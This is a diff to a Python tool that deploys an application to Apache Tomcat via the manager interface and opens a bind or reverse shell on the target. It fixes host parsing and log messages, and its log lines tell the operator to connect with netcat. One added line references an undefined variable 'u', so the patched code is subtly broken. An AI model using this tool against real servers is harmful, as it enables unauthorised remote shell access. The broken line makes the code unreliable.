@@ -111,6 +111,8 @@ def shellHandler(mode, hostn, opts):
 
 	portpos = hostn.find(':')
         host = extractHostAddress(hostn, opts.url)
+        if portpos != -1:
+            host = host[:portpos]
 
 	sock = None
 	serv = None
@@ -179,7 +181,6 @@ def connectToBindShell(sock, host, opts):
 	status = False
 	for retry in range(retries):
 		try:
-                        print host, opts.port
 			sock.connect((host, int(opts.port)))
 			status = True
 			break
@@ -275,7 +276,6 @@ def chooseShellFunctionality(opts):
 def prepareTcpShellCode(opts):
 	host = opts.host
 	port = opts.port
-        print host, port
 
 	socketInvocation = ''
 	mode = chooseShellFunctionality(opts)
@@ -451,6 +451,12 @@ def invokeApplication(browser, url, opts):
 	appurl = os.path.join(url, opts.appname) + '/'
 	logger.debug('Invoking application at url: "%s"' % appurl)
 
+        host = url[:url.find(':')] if url.find(':') != -1 else url
+        if '://' in host:
+            host = host[host.find('://')+3:]
+        if '/' in host:
+            host = host[:host.find('/')]
+
 	try:
 		mode = chooseShellFunctionality(opts)
 		if opts.shellpass and mode > 0:
@@ -459,13 +465,13 @@ def invokeApplication(browser, url, opts):
 
 		if opts.noconnect:
 			if mode == 0:
-				logger.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
+				logger.warning("Connect back to your shell at: %s:%s" % (u, opts.port))
 			elif mode == 1:
 				logger.warning("Set up your incoming shell listener, I'm giving you %d seconds." % (int(opts.timeout) / 2))
 				time.sleep(int(opts.timeout) / 2)
 			elif mode == 2:
 				logger.warning("Shell has been binded. Go and connect back to it!")
-				logger.warning("How about: \t$ nc %s %s" % (url[:url.find(':')], opts.port))
+				logger.warning("How about: \t$ nc %s %s" % (host, opts.port))
 		elif not opts.noconnect and mode == 2:
 			SHELLEVENT.set()
 
@@ -619,7 +625,7 @@ def browseToManager(host, url, user, password):
 		except urllib2.URLError, e:
 			error = str(e)
 			if 'Connection refused' in error:
-				logger.warning('Could not connect with "%s", connection refused.' % baseurl)
+				logger.warning('Could not connect with "%s", connection refused.' % managerurl)
 			elif 'Error 401' in error or '403' in error:
 				logger.warning('Invalid credentials supplied for Apache Tomcat.')
 			else:
